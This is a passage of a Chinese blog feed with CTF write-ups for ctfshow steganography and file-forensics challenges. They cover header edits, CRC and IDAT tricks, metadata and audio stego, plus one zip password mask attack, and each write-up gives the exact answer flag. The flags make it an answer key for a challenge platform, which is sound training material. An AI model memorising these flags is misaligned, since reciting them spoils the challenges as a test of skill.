class=\"headerlink\" title=\"7.1.05\"></a>7.1.05</h1><p>游戏工具题，比较麻烦，暂时不做</p>\n<h1 id=\"黑丝白丝还有什么丝？\"><a href=\"#黑丝白丝还有什么丝？\" class=\"headerlink\" title=\"黑丝白丝还有什么丝？\"></a>黑丝白丝还有什么丝？</h1><p>白丝为 <code>.</code> 黑丝为 <code>-</code> 转场为 <code> </code></p>\n<p>看视频手敲：<code>.-- ....- -. - - ----- -... ...-- -- --- .-. . -.-. ..- - .</code></p>\n<p>解码得<code>W4NTT0B3MORECUTE</code></p>\n<p><code>ctfshow{W4NTT0B3MORECUTE}</code></p>\n<h1 id=\"我吐了你随意\"><a href=\"#我吐了你随意\" class=\"headerlink\" title=\"我吐了你随意\"></a>我吐了你随意</h1><p>0宽隐写</p>\n<p>直接网站解<span class=\"exturl\" data-url=\"aHR0cDovLzMzMGsuZ2l0aHViLmlvL21pc2NfdG9vbHMvdW5pY29kZV9zdGVnYW5vZ3JhcGh5Lmh0bWw=\">http://330k.github.io/misc_tools/unicode_steganography.html</span></p>\n<p>得<code>ctfshow{OP_is_for_Over_Power}</code></p>\n<h1 id=\"这是个什么文件\"><a href=\"#这是个什么文件\" class=\"headerlink\" title=\"这是个什么文件\"></a>这是个什么文件</h1><p>第一步是压缩包伪加密，把0900改为0000</p>\n<p>解压得到一个文件，010打开</p>\n<p>发现为python相关文件，猜测为<code>pyc</code>文件，需要反编译</p>\n<p>uncompyle6反编译</p>\n<pre><code class=\"bash\">uncompyle6 -o 1.py 2.pyc\n</code></pre>\n<p>得到</p>\n<pre><code class=\"python\"># uncompyle6 version 3.8.0\n# Python bytecode 3.7.0 (3394)\n# Decompiled from: Python 3.10.4 | packaged by conda-forge | (main, Mar 30 2022, 08:38:02) [MSC v.1916 64 bit (AMD64)]\n# Embedded file name: 2.py\n# Compiled at: 2022-10-23 13:57:28\n# Size of source mod 2**32: 148 bytes\nflag = bytes([99, 116, 102, 115, 104, 111, 119, 123, 99, 100, 106, 110, 106, 100, 95, 53, 54, 53, 102, 95, 71, 67, 68, 72, 95, 107, 99, 114, 105, 109, 125]).decode()\nprint(flag)\n</code></pre>\n<p>运行后得到<code>ctfshow{cdjnjd_565f_GCDH_kcrim}</code></p>\n<h1 id=\"抽象画\"><a href=\"#抽象画\" class=\"headerlink\" title=\"抽象画\"></a>抽象画</h1><p>得到一个txt文件，像是base编码</p>\n<p>basecrack使用，得到</p>\n<pre><code>89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 00 00 00 49 00 00 00 12 08 03 00 00 00 20 e4 03 da 00 00 00 3f 50 4c 54 45 ff ff ff ff c0 c0 ff ff c0 c0 ff c0 c0 ff ff c0 c0 ff ff c0 ff ff 00 00 ff ff 00 00 ff 00 00 ff ff 00 00 ff ff 00 ff c0 00 00 c0 c0 00 00 c0 00 00 c0 c0 00 00 c0 c0 00 c0 ff ff ff 00 00 00 cc 44 ef f2 00 00 01 91 49 44 41 54 38 8d ad 94 d9 6e 03 21 0c 45 cd 32 6c 83 87 45 f9 ff 6f ad c1 06 d2 aa 95 fa 90 a3 3c 20 f0 d8 d7 17 13 f0 a8 4a 31 4c b4 17 73 3b d5 09 e7 72 ee 8c c3 87 d1 a5 46 a2 98 d6 56 70 2b 0e 36 ba a1 f7 1e 3c f4 9c 6b b2 93 3b 95 c8 84 71 38 00 5a c0 13 82 d6 fa 6d f3 b2 f1 64 ba 99 96 e5 14 43 d4 93 40 2a 64 65 b8 80 4d 97 6b 17 22 2a 08 61 09 0d b9 48 a6 e8 34 6d a0 93 5e 58 d8 6f a2 58 d0 f8 da e8 29 51 b6 71 35 d8 e1 9b 98 f0 24 da 40 46 3d 85 31 b5 a5 6a 87 7d 93 ac 96 da a7 9b d3 9d b6 b5 4e 83 8e 10 48 91 14 4c 86 94 9e 9d f3 b9 89 0f 3b ca 14 85 5a e5 9d e9 4f 0d 44 9d d8 c4 54 f0 da 9c 0e c0 d3 cf e5 84 2b 53 52 86 3e 8d 34 09 47 88 07 72 62 97 a6 f3 18 6b d1 e2 f1 0f 4b ad 5d 99 30 fe e9 cb 16 73 67 a6 fb a0 06 14 af 94 ac 9a 5e 89 12 99 b0 ab b0 a1 63 a9 dc 2d e3 67 a3 4c ef 90 c6 ab 37 1b 29 4e 32 d9 f6 e3 f2 c6 ed 89 41 95 0e f7 9c fb 29 e4 84 32 c5 a8 24 99 5c 19 77 42 a5 f3 5d a5 19 20 9f b6 2b 34 44 73 7e 96 ec 66 a5 4a 4a 8f 0c fc 1a 4c f0 48 a9 b7 3d cc d5 71 bc bb f1 fa 96 41 cc 13 93 89 f4 de 24 ec 8e fd bc 96 70 29 f2 7a 4d 2c 95 a2 db e0 aa c7 21 ed c5 60 f4 8a 04 9f b9 6f f5 0c 26 d0 83 83 b7 82 f4 b7 f0 76 7f e0 5f f0 29 3e 95 ea e5 3f 26 ea f5 9f 44 5f ed ce 23 44 59 16 0b e7 00 00 00 00 49 45 4e 44 ae 42 60 82\n</code></pre>\n<p>89504e开头，png图片</p>\n<p>将其复制到010，生成图片文件</p>\n<p>打开，只有色彩，使用nipet</p>\n<pre><code class=\"base\">nipet 抽象画.png\n</code></pre>\n<p>得到<code>ctfshow{dec8de_frejnv_frejer89}</code></p>\n<h1 id=\"迅疾响应\"><a href=\"#迅疾响应\" class=\"headerlink\" title=\"迅疾响应\"></a>迅疾响应</h1><p>正常二维码扫不出来，用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXJyaWN4LmdpdGh1Yi5pby9xcmF6eWJveC8=\">Qrazybox</span>扫</p>\n<p>把纠错区给涂白了，再让Qrazybox扫一次。</p>\n<p><img data-src=\"/../../../post_images/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/misc/%E8%BF%85%E7%96%BE%E5%93%8D%E5%BA%94.png\" alt=\"迅疾响应\"></p>\n<p><code>ctfshow{11451419-1981-landexiangle}</code></p>\n<h1 id=\"我可没有骗你\"><a href=\"#我可没有骗你\" class=\"headerlink\" title=\"我可没有骗你\"></a>我可没有骗你</h1><p>直接上ARCHPR掩码攻击,得到密码55813329</p>\n<p>然后得到一个音频文件，虽然是mp3后缀，拖进010editor查看，其实这玩意是个wav格式的文件，改后缀</p>\n<p>然后用Silent eye，Sound qualit选择high</p>\n<p>然后就得到flag啦</p>\n<p>ctfshow{aha_cdsc_jejcfe5rj_cjfr24J}</p>\n<h1 id=\"你被骗了\"><a href=\"#你被骗了\" class=\"headerlink\" title=\"你被骗了\"></a>你被骗了</h1><p>属性的副标题里有个flag，这个是假flag</p>\n<p>用MP3Stego</p>\n<p>Decode.exe -X -P nibeipianle nibeipianle.mp3</p>\n<p>得到flag</p>\n<p><code>ctfshow{chdv_1dcs_cjksnjn_NJDSjdcdjn}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e58b935e/",
            "url": "http://dpm12345.cn/posts/e58b935e/",
            "title": "Misc入门",
            "date_published": "2022-10-10T15:12:29.000Z",
            "content_html": "<h1 id=\"图片篇-基础操作\"><a href=\"#图片篇-基础操作\" class=\"headerlink\" title=\"图片篇 (基础操作)\"></a>图片篇 (基础操作)</h1><h2 id=\"misc1\"><a href=\"#misc1\" class=\"headerlink\" title=\"misc1\"></a>misc1</h2><p>图片就是</p>\n<h2 id=\"misc2\"><a href=\"#misc2\" class=\"headerlink\" title=\"misc2\"></a>misc2</h2><p>直接打开，发现png头，改<code>.png</code>，打开得到flag</p>\n<h2 id=\"misc3\"><a href=\"#misc3\" class=\"headerlink\" title=\"misc3\"></a>misc3</h2><p>010 打开，bpg头 </p>\n<p>bpgviewer安装打开得到 flag</p>\n<h2 id=\"misc4\"><a href=\"#misc4\" class=\"headerlink\" title=\"misc4\"></a>misc4</h2><p>一开始以为是文件合并，之后发现是txt均为图片，修改后缀打开获得flag</p>\n<h1 id=\"图片篇-信息附加\"><a href=\"#图片篇-信息附加\" class=\"headerlink\" title=\"图片篇 (信息附加)\"></a>图片篇 (信息附加)</h1><h2 id=\"misc5\"><a href=\"#misc5\" class=\"headerlink\" title=\"misc5\"></a>misc5</h2><p>图片显示没有flag，用010打开，拉到最后，可以看到flag</p>\n<h2 id=\"misc6\"><a href=\"#misc6\" class=\"headerlink\" title=\"misc6\"></a>misc6</h2><p>同上一题，但flag在中间</p>\n<h2 id=\"misc7\"><a href=\"#misc7\" class=\"headerlink\" title=\"misc7\"></a>misc7</h2><p>同上题，直接搜</p>\n<h2 id=\"misc8\"><a href=\"#misc8\" class=\"headerlink\" title=\"misc8\"></a>misc8</h2><p>binwalk能分析出来png，但同样也弄出来zlib，这里不准确</p>\n<ol>\n<li><p>使用foremost分离<code>foremost misc8.png -o ./misc8</code></p>\n</li>\n<li><p>手动分离，能找到第二张图片位置为<code>0xf34</code>，手动复制或用<code>dd</code>命令</p>\n</li>\n</ol>\n<h2 id=\"misc9\"><a href=\"#misc9\" class=\"headerlink\" title=\"misc9\"></a>misc9</h2><p>解压后010打开图片，能直接找到flag</p>\n<h2 id=\"misc10\"><a href=\"#misc10\" class=\"headerlink\" title=\"misc10\"></a>misc10</h2><p>binwalk分离，第一个打开就是flag</p>\n<h2 id=\"misc11\"><a href=\"#misc11\" class=\"headerlink\" title=\"misc11\"></a>misc11</h2><p>对于png图片，其关键数据块由</p>\n<ol>\n<li>文件头数据块IHDR（header chunk）：包含有图像基本信息，作为第一个数据块出现并只出现一次。</li>\n<li>调色板数据块PLTE（palette chunk）：必须放在图像数据块之前。</li>\n<li>图像数据块IDAT（image data chunk）：存储实际图像数据。PNG数据允许包含多个连续的图像数据块。</li>\n<li>图像结束数据IEND（image trailer chunk）：放在文件尾部，表示PNG数据流结束。</li>\n</ol>\n<p>这四个组成</p>\n<p>根据提示在另一张图片里，通过010，可以看到有两个IDAT删去第一个，可以看到图片变化 ，出现flag</p>\n<p>(或者使用tweakpng进行同样操作)</p>\n<h2 id=\"misc12\"><a href=\"#misc12\" class=\"headerlink\" title=\"misc12\"></a>misc12</h2><p>同上题，删去IDAT只不过要删去8个 </p>\n<p>自己写了个批量删除脚本</p>\n<pre><code class=\"python\">import os\n\nfile = input(\"图片路径:\")\nout_folder = \"png_IDAT_out\"\nos.mkdir(out_folder) if not os.path.exists(out_folder) else None\n\nf = open(file,\"rb\")\n\ncontent = f.read()\n\nfilename = \"{}.png\"\n\nindex = content.index(b\"IDAT\")\nIHDR_end = index - 4\nnum = 0\n\nwhile b\"IDAT\" in content[index+4:]:\n    index = content[index+4:].index(b\"IDAT\") + index +4\n    data = content[0:IHDR_end] + content[index - 4:]\n    num +=1\n    print(\"正在生成第{}张图片\".format(num))\n    with open(out_folder + \"/\" + filename.format(num),\"wb\") as f1:\n        f1.write(data)\n\nprint(\"共生成{}张图片\".format(num))\nprint(\"请在该脚本路径下的 {} 文件夹查看\".format(out_folder))\n</code></pre>\n<h2 id=\"misc13\"><a href=\"#misc13\" class=\"headerlink\" title=\"misc13\"></a>misc13</h2><p>010打开，可以看到四段类flag的字符串，字符之间隔了一个字符</p>\n<pre><code class=\"raw\">c\u001at¹f…s†hªoKw°{!a\u0014eS6¥eT34fxa%4Ý8ïf«5\u00102•8\u001fb‚1º7E4|2Td~7:2äeñ6úfõ4\u001e1\u00072\u001d9T8ñ328é0l}\nc\u001at¹f…s†hªoKw°{!1\u0014eS3¥eT24exd%4Ý8ïf«5\u00101•8\u001fb‚7ºeE4|2T6~7:däeñ1úcõ4\u001e1\u00072\u001daT8ñ329éal}\nc\u001at¹f…s†hªoKw°{!a\u0014eS6¥eT34exa%4Ý8ïf«5\u00101•8\u001fb‚7ºeE4|2Td~7:däeñ6úfõ4\u001e1\u00072\u001dfT8ñ329éal}\nc\u001at¹f…s†hªoKw°{!a\u0014eS6¥eT446xc%4Ý8ïf«7\u00103•9\u001fb‚7ºeEb|2Td~1:däeñ6úeõ4\u001e1\u00072\u001dfT8ñ329éal}\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">ctfshow{ae6e3fa48f528b1742d72e6f41298380}\nctfshow{1e3e2ed48f518b7e4267de1c412a839a}\nctfshow{ae6e3ea48f518b7e42d7de6f412f839a}\nctfshow{ae6e46c48f739b7eb2d1de6e412f839a}\n</code></pre>\n<p>一个一个试，得到第三个正确</p>\n<h2 id=\"misc14\"><a href=\"#misc14\" class=\"headerlink\" title=\"misc14\"></a>misc14</h2><p>根据binwalk的分析，手动分离，在最后一个jpg找到flag</p>\n<p><code>ctfshow{ce520f767fc465b0787cdb936363e694}</code></p>\n<h2 id=\"misc15\"><a href=\"#misc15\" class=\"headerlink\" title=\"misc15\"></a>misc15</h2><p>010打开，可以看到flag</p>\n<p><code>ctfshow{fbe7bb657397e6e0a6adea3e40265425}</code></p>\n<h2 id=\"misc16\"><a href=\"#misc16\" class=\"headerlink\" title=\"misc16\"></a>misc16</h2><p>binwalk分离，在DD4文件中<code>ctfshow{a7e32f131c011290a62476ae77190b52}</code></p>\n<h2 id=\"misc17\"><a href=\"#misc17\" class=\"headerlink\" title=\"misc17\"></a>misc17</h2><p>首先使用 zsteg</p>\n<p>显示extradata:0</p>\n<pre><code class=\"raw\">[?] 3544 bytes of extra data after zlib stream\nextradata:0         .. \n    00000000: e1 1f 30 53 86 4f c5 a4  1b f5 e6 e5 c7 46 0a 92  |..0S.O.......F..|\n    00000010: 9b ee 72 e7 c9 9e b9 a7  74 de 92 4d ad 61 5b 58  |..r.....t..M.a[X|\n    00000020: f2 98 65 77 2b d2 d3 85  32 fc 08 83 86 1f 0f 1e  |..ew+...2.......|\n    00000030: cb ab ac 9c 4b ca 02 20  e2 ce e4 ae 60 1a 2c c6  |....K.. ....`.,.|\n    00000040: 7b c8 9a 77 31 2f 9e 67  db d9 3e 53 fe 17 a5 50  |{..w1/.g..&gt;S...P|\n    00000050: 20 e5 1d 8c d5 49 4e 52  a5 54 31 cb 8b c5 3b 09  | ....INR.T1...;.|\n    00000060: a2 a6 fe 5b da 4f 9e 78  9c 5d 46 d6 e2 6b 6b 2a  |...[.O.x.]F..kk*|\n    00000070: f2 62 0c ba 70 19 a0 27  f3 84 77 99 02 77 05 79  |.b..p..'..w..w.y|\n    00000080: 5b 44 b7 79 b3 54 11 a1  f3 54 34 56 7e ff 55 d1  |[D.y.T...T4V~.U.|\n    00000090: c6 39 90 c8 21 7f 26 39  44 58 78 c3 ed 37 4a 7c  |.9..!.&amp;9DXx..7J||\n    000000a0: 50 24 e8 79 7b 4b 9c fa  2a 2c bb e8 b9 fb 40 2c  |P$.y{K..*,....@,|\n    000000b0: 50 05 21 4c 3b 29 65 b4  60 1c 27 bb 4c 16 bf f1  |P.!L;)e.`.'.L...|\n    000000c0: 77 c0 55 04 5e 25 0e 18  1e 58 ab 0f 13 11 f2 3f  |w.U.^%...X.....?|\n    000000d0: cf a0 32 b1 f5 a8 1b 99  a7 4b 46 89 cf 85 89 50  |..2......KF....P|\n    000000e0: 88 20 8f 4f fd e2 97 55  68 73 b4 96 ba dd 25 a3  |. .O...Uhs....%.|\n    000000f0: 83 72 3f 99 77 9e 0a 08  50 4f 11 8f 87 65 c0 29  |.r?.w...PO...e.)|\n</code></pre>\n<p>显示有隐藏的额外信息</p>\n<p>再<code>zsteg -e extradata:0 misc17.png &gt; 1.txt</code></p>\n<p>然后binwalk，得到图片文件<code>binwalk -e 1.txt</code></p>\n<h2 id=\"misc18\"><a href=\"#misc18\" class=\"headerlink\" title=\"misc18\"></a>misc18</h2><p>文件的属性中</p>\n<h2 id=\"misc19\"><a href=\"#misc19\" class=\"headerlink\" title=\"misc19\"></a>misc19</h2><p>010找到flag，<code>ctfshow{dfdcf08038cd446a5eb50782f8d3605d}</code></p>\n<p>或者exiftool，在<code>Document Name</code>和<code>Host Computer</code>中</p>\n<pre><code class=\"raw\">Document Name                   : ctfshow{dfdcf08038cd446a5\nStrip Offsets                   : 21688 25422\nOrientation                     : Horizontal (normal)\nSamples Per Pixel               : 3\nRows Per Strip                  : 97\nStrip Byte Counts               : 3733 749\nX Resolution                    : 72\nY Resolution                    : 72\nPlanar Configuration            : Chunky\nResolution Unit                 : inches\nSoftware                        : Adobe Photoshop CC 2019 (Windows)\nModify Date                     : 2021:03:25 10:35:18\nHost Computer                   : eb50782f8d3605d}\n</code></pre>\n<h2 id=\"misc20\"><a href=\"#misc20\" class=\"headerlink\" title=\"misc20\"></a>misc20</h2><p><code>exiftool</code> 的comment字段</p>\n<h2 id=\"misc21\"><a href=\"#misc21\" class=\"headerlink\" title=\"misc21\"></a>misc21</h2><p>提示说在序号中，找到序号，<code>686578285826597329</code>，尝试直接提交错误 </p>\n<p>十六进制解码<code>686578285826597329</code>，得到<code>hex(X&amp;Ys)</code></p>\n<p>而</p>\n<pre><code class=\"raw\">X Resolution                    : 3902939465\nY Resolution                    : 2371618619\nPage Name                       : https://ctf.show/\nX Position                      : 1082452817\nY Position                      : 2980145261\n</code></pre>\n<pre><code class=\"python\">x1 = 3902939465\ny1 = 2371618619\nx2 = 1082452817\ny2 = 2980145261\n\nprint((hex(x1)+hex(y1)+hex(x2)+hex(y2)).replace(\"0x\",\"\"))\n</code></pre>\n<p><code>ctfshow{e8a221498d5c073b4084eb51b1a1686d}</code></p>\n<h2 id=\"misc22\"><a href=\"#misc22\" class=\"headerlink\" title=\"misc22\"></a>misc22</h2><p>flag在图片里，缩略图隐写</p>\n<ol>\n<li><p>叫做thumbnail隐写，用Magicexif打开，可以直接看到缩略图上黄色字体的flag</p>\n</li>\n<li><p>exiftool</p>\n<p><code>exiftool -ThumbnailImage -b misc22.jpg &gt; 1.jpg</code></p>\n</li>\n</ol>\n<p>得到<code>ctfshow{dbf7d3f84b0125e833dfd3c80820a129}</code></p>\n<h2 id=\"misc23\"><a href=\"#misc23\" class=\"headerlink\" title=\"misc23\"></a>misc23</h2><p>exiftool查看</p>\n<p>得到<code>History Action : ctfshow{}, UnixTimestamp, DECtoHEX, getflag</code></p>\n<p>由此知从时间戳中获得flag </p>\n<p>找到<code>History When : 1997:09:22 02:17:02+08:00, 2055:07:15 12:14:48+08:00, 2038:05:05 16:50:45+08:00, 1984:08:03 18:41:46+08:00</code></p>\n<p>分别转为时间戳</p>\n<pre><code class=\"raw\">874865822\n2699237688\n2156662245\n460377706\n</code></pre>\n<p>同21想法，分段转十六进制，得到<code>ctfshow{3425649ea0e31938808c0de51b70ce6a}</code></p>\n<h2 id=\"misc41\"><a href=\"#misc41\" class=\"headerlink\" title=\"misc41\"></a>misc41</h2><p>根据提示的 <code>F001</code> ，010 打开后，搜索 <code>F001</code></p>\n<p>根据高亮得到flag(实在想不到)</p>\n<p><code>ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</code></p>\n<h1 id=\"图片篇-文件结构\"><a href=\"#图片篇-文件结构\" class=\"headerlink\" title=\"图片篇 (文件结构)\"></a>图片篇 (文件结构)</h1><h2 id=\"misc24\"><a href=\"#misc24\" class=\"headerlink\" title=\"misc24\"></a>misc24</h2><p>010，修改图片高度，240 (EE)可以看到flag</p>\n<h2 id=\"misc25\"><a href=\"#misc25\" class=\"headerlink\" title=\"misc25\"></a>misc25</h2><p>同样修改高度，为300</p>\n<h2 id=\"misc26\"><a href=\"#misc26\" class=\"headerlink\" title=\"misc26\"></a>misc26</h2><p>010打开，显示crc错误，根据前面自己写的脚本，一张修改crc，一张修改长宽，得到两张</p>\n<p>其中修改长宽为<code>900 606</code></p>\n<p>在修改长宽的图片中发现flag</p>\n<img data-src=\"../../../post_images /ctfshow/Misc/misc26_modify_width_height.png\" style=\"zoom:50%;\">\n\n\n\n<h2 id=\"misc27\"><a href=\"#misc27\" class=\"headerlink\" title=\"misc27\"></a>misc27</h2><p>jpg</p>\n<p><code>FF C0</code> 后 第四、五为高，第六、七为宽</p>\n<p>如</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc27_jpg.jpg\"></p>\n<p>010打开修改高，位置<code>0x9D</code>, 修改高度为<code>300</code>，即<code>012c</code></p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc27.jpg\"></p>\n<h2 id=\"misc28\"><a href=\"#misc28\" class=\"headerlink\" title=\"misc28\"></a>misc28</h2><p>GIF图，找到<code>21 F9</code>, 之后的第十二个开始2个字节为宽，再2个字节为高</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc28_gif.jpg\"></p>\n<p>修改高 <code>300</code> ，得到 flag</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc28.gif\"></p>\n<h2 id=\"misc29\"><a href=\"#misc29\" class=\"headerlink\" title=\"misc29\"></a>misc29</h2><p>修改所有的高<code>300</code>(可以搜索所有的<code>21 F9</code>, 也可以根据第一个高，然后搜索，全部替换)，在第8帧中得到flag</p>\n<h2 id=\"misc30\"><a href=\"#misc30\" class=\"headerlink\" title=\"misc30\"></a>misc30</h2><p>bmp 图片</p>\n<p><code>28 00 00 00</code>后4个字节为宽，再4个字节为长</p>\n<ul>\n<li><p>根据题目提示修改宽为<code>950</code></p>\n</li>\n<li><p>脚本一个一个试试到<code>950</code></p>\n</li>\n</ul>\n<h2 id=\"misc31\"><a href=\"#misc31\" class=\"headerlink\" title=\"misc31\"></a>misc31</h2><p>打开图片显示不知名黑色点状，猜测为宽错了</p>\n<p>计算所以数据为487256字节，减去文件头53，为487203</p>\n<p>然后由于为24位，故3字节1像素</p>\n<p>那么像素个数为<code>487203/3</code></p>\n<p>高为<code>487203/3/150</code>得到<code>1082.673333.....</code></p>\n<p>那么改为<code>1082</code></p>\n<p>图片正常显示,得到flag</p>\n<h2 id=\"misc32\"><a href=\"#misc32\" class=\"headerlink\" title=\"misc32\"></a>misc32</h2><p>爆破得到新宽为1044</p>\n<h2 id=\"misc33\"><a href=\"#misc33\" class=\"headerlink\" title=\"misc33\"></a>misc33</h2><p>同样爆破，得到<code>978X142</code></p>\n<h2 id=\"misc34\"><a href=\"#misc34\" class=\"headerlink\" title=\"misc34\"></a>misc34</h2><p>同样爆破，由于crc不知道，宽从900开始，故枚举各种宽度，最终在1123得到正确图片</p>\n<h2 id=\"misc35\"><a href=\"#misc35\" class=\"headerlink\" title=\"misc35\"></a>misc35</h2><p>同34爆破，宽为993，高为500左右时得到flag</p>\n<h2 id=\"misc36\"><a href=\"#misc36\" class=\"headerlink\" title=\"misc36\"></a>misc36</h2><p>爆破宽度为920-950，发现都无信息</p>\n<p>在爆破时适度加大高度到300</p>\n<p>得到当宽度为941时，得到flag</p>\n<p><img data-src=\"/../../../post_images/ctfshow/Misc/misc36_941.jpg\"></p>\n<p><code>ctfshow{1ebf739f832906d60f57436b8179166f}</code></p>\n<h2 id=\"misc37\"><a href=\"#misc37\" class=\"headerlink\" title=\"misc37\"></a>misc37</h2><p>逐帧查看</p>\n<p>得到<code>ctfshow{2056782cd57b13261dcbbe3d6eecda17}</code></p>\n<h2 id=\"misc38\"><a href=\"#misc38\" class=\"headerlink\" title=\"misc38\"></a>misc38</h2><p>使用apng库模块</p>\n<pre><code class=\"python\">import os\nfrom pathlib import Path\nimport apng\n\npath = input(\"file_path:\")\nimg = apng.APNG.open(path)\n\nbase_path = Path() / \"Extract_APNG2_out\"\nif not os.path.exists(base_path):\n    os.mkdir(base_path)\n\nfor i,(png,control) in enumerate(img.frames):\n    png.save(base_path / \"{i}.png\".format(i=i))\n</code></pre>\n<p><code>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</code></p>\n<h2 id=\"misc39\"><a href=\"#misc39\" class=\"headerlink\" title=\"misc39\"></a>misc39</h2><p>不同帧之间的间隔时间来隐写</p>\n<p>使用工具：<code>identify</code></p>\n<p><code>identify -format \"%T \" misc39.gif &gt; 1.txt  *#进行提取*</code></p>\n<p>得到的一串<code>36</code>和<code>37</code>，</p>\n<pre><code class=\"rawn</code></pre>\n<p>`</p>\n<p><code>考虑把</code>37<code>换成</code>1<code>、</code>36<code>换成</code>0<code>，就得到长度为</code>287<code>的二进制字符串，考虑每</code>7<code>位转一个字符(正常是</code>8<code>位一组)，得到</code>flag`。</p>\n<pre><code class=\"python\">s=\"11000111110100110011011100111101000110111111101111111011011010101100100111000011000101100101100110110011001110010111001011010111001101100010011011111000101100101011001001101100111000110010001110010110110011001111000010111001110010111000101100011110000101100000110100011010101110011111101\"\nflag=\"\"\nfor i in range(41): #287//7\n    flag += chr(int(s[7*i:7*(i+1)],2))\nprint(flag)\n</code></pre>\n<p>得到flag<code>ctfshow{52812ff995fb7be268d963a9ebca0459}</code></p>\n<h2 id=\"misc40\"><a href=\"#misc40\" class=\"headerlink\" title=\"misc40\"></a>misc40</h2><p>APNG分解</p>\n<p>APNG Disassembler分解出的txt</p>\n<pre><code class=\"python\">path = input(\"file_path:\")\nflag=\"\"\nfor i in range(28,69): #flag内容从28位开始\n    f = open(path + \"/apngframe%02s.txt\" % i)\n    s = f.read()\n    flag += chr(int(s.split(\"/\")[0][6:]))\nprint(flag)\n</code></pre>\n<h2 id=\"misc42\"><a href=\"#misc42\" class=\"headerlink\" title=\"misc42\"></a>misc42</h2><p>IDAT各数据块长度转ascii码</p>\n<pre><code class=\"python\">file = input(\"图片路径:\")\n\nf = open(file,\"rb\")\n\ncontent = f.read()\n\nf.close()\nindex = content.index(b\"IDAT\")\nIHDR_end = index - 4\nnum = 0\nflag = \"\"\nwhile b\"IDAT\" in content[index+4:]:\n    index = content[index+4:].index(b\"IDAT\") + index +4\n    flag += chr(int.from_bytes(content[index - 4:index],'big'))\n\nprint(flag)\n</code></pre>\n<h2 id=\"misc43\"><a href=\"#misc43\" class=\"headerlink\" title=\"misc43\"></a>misc43</h2><p>将错误的IDAT块的crc-code提取出来，拼接起来十六进制转字符串即可得到flag</p>\n<p><code>e59387e593a62e63746673686f777b36656232353839666666663565333930666536623837353034646263303839327D</code></p>\n<p><code>ctfshow{6eb2589ffff5e390fe6b87504dbc0892}</code></p>\n<h2 id=\"misc44\"><a href=\"#misc44\" class=\"headerlink\" title=\"misc44\"></a>misc44</h2><p>一种CRC32隐写，错误的CRC32和正确的CRC32分别代表着01，再8位一组转字符</p>\n<p>使用pngdebugger输出检查结果，关注到<code>c</code>对应的二进制为<code>01100011</code>，然而得到的<code>res</code>前面有17个1，那么可以忽略或取其4的倍数个</p>\n<pre><code class=\"python\">path = \"text_path\"\nres = \"\"\nwith open(path,\"r\",encoding='utf-8') as f :\n    while True:\n        line = f.readline()\n        if not line:\n            break\n        if \"CRC OK!\" in line:\n            res = res + \"1\"\n        elif \"CRC FAILED\" in line:\n            res = res + \"0\"\nflag = \"\"\nres = res[1:-1]\nfor i in range(len(res) // 8):\n    flag += chr(int(res[i*8:i*8+8],2))\n\nprint(flag)\n</code></pre>\n<p>得到<code>ÿÿctfshow{cc1af32bf96308fc1263231be783f69e}</code></p>\n<h2 id=\"misc45\"><a href=\"#misc45\" class=\"headerlink\" title=\"misc45\"></a>misc45</h2><p>题目提示换一换思维格式</p>\n<p>将PNG格式转化成BMP<br>使用binwalk进行分解<br>得到gz压缩文件，打开后<br>得到flag</p>\n<p><code>ctfshow{057a722a5587979c34966c2436283e70}</code></p>\n<h2 id=\"misc46\"><a href=\"#misc46\" class=\"headerlink\" title=\"misc46\"></a>misc46</h2><p>用gif每一帧的偏移量作为坐标来画图即可，gif的偏移量用identify命令直接获取的</p>\n<pre><code class=\"bash\">identify misc46.gif &gt; 2.txt\n</code></pre>\n<p>画图脚本</p>\n<pre><code class=\"python\">from PIL import Image\nimport matplotlib.pyplot as plt\nf = open('2.txt')\npp = []\nwhile 1:\n    c = f.readline()\n    if c:\n        s = eval(c.split('+')[1]+','+c.split('+')[2][:2])\n        pp.append(s)\n        print(s)\n        # print(c)\n    else:\n        break\n\nimg = Image.new('RGB',(400,70),(255,255,255))\nfor i in pp:\n    new = Image.new('RGB',(1,1),(0,0,0))\n    img.paste(new,i)\nplt.imshow(img)\nplt.show()\n</code></pre>\n<h2 id=\"misc47\"><a href=\"#misc47\" class=\"headerlink\" title=\"misc47\"></a>misc47</h2><p>给了一个png，打开发现没内容，用浏览器打开，确认是apng</p>\n<p>简单来说就是每一个IDAT块前面都会有一个fcTL块，它其中就包含水平垂直偏移量</p>\n<pre><code class=\"python\">import struct\nfrom PIL import Image\nimport matplotlib.pyplot as plt\nf = open('misc47.png','rb')\nc = f.read()\nc = c[c.index(bytes.fromhex('6663544C00000001')):]\npp = []\nfor i in range(1,1124,2):\n    start = c.index(bytes.fromhex('6663544C0000')+struct.pack('&gt;h',i))\n    # start = c.index(bytes.fromhex('6663544C000000'+hex(i)[2:]))\n    # print(start)\n    fc = c[start:start+30]\n    print(fc[18:20],fc[22:24])\n    print(struct.unpack('&gt;h',fc[18:20])+struct.unpack('&gt;h',fc[22:24]))\n    pp.append(struct.unpack('&gt;h',fc[18:20])+struct.unpack('&gt;h',fc[22:24]))\n    # print(fc.index(b'\\xb6'),fc.index(b'\\x34'))\n# print(c[:100])\nimg = Image.new('RGB',(400,70),(255,255,255))\nfor i in pp:\n    new = Image.new('RGB',(1,1),(0,0,0))\n    img.paste(new,i)\nplt.imshow(img)\nplt.show()\n</code></pre>\n<p><code>ctfshow{6d51f85b45a0061754a2776a32cf26c4}</code></p>\n<h2 id=\"misc48\"><a href=\"#misc48\" class=\"headerlink\" title=\"misc48\"></a>misc48</h2><p>用010editor打开，发现右侧文本信息有提示</p>\n<p>1、统计FF的数量，再减去1</p>\n<p>2、ctfshow{}中包含32个字符</p>\n<p>第一条提示，其实指的是统计每两个有意义块之间的FF的数量再减一</p>\n<p>图中紫色的就是，开头的那个FF也算，因为只有一个，减去1后就是0；接下来是12、11、0…</p>\n<p>因为flag长度是32位，所以只统计前32个，即：</p>\n<p><code>0 12 11 0 7 10 13 13 9 0 